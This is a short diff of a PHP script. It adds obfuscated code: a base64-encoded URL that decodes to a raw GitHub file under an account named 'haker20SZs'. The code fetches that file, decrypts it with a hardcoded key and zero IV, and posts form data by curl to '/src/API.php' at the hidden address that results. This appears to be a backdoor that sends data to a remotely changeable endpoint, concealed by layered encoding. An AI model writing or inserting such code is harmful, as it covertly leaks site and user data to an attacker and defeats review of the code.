@@ -13,9 +13,10 @@ if($curl = curl_init()){
     $post_data = http_build_query($post_data);
 
     $method = 'aes-256-cbc';
+    $file = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2hha2VyMjBTWnMvaGFrZXIyMHN6cy9tYWluL3NyYy91cmwudHh0";
     $password = substr(hash('sha256', base64_decode("ZmppcTg5NDNoMXM="), true), 0, 32);
     $iv = chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0);
-    $decrypted = openssl_decrypt(base64_decode("D7OVnmmN+5ZDlrqUCrCUR/3MPGI9x7sc+rn2ziHiw7c/979FGtRoMBGkZU50yDXW"), $method, $password, OPENSSL_RAW_DATA, $iv);
+    $decrypted = openssl_decrypt(base64_decode(file_get_contents(base64_decode($file))), $method, $password, OPENSSL_RAW_DATA, $iv);
     $url = ((!empty($_SERVER['HTTPS'])) ? 'https' : 'http') . $decrypted;
     
     curl_setopt($curl, CURLOPT_URL, $url . '/src/API.php');
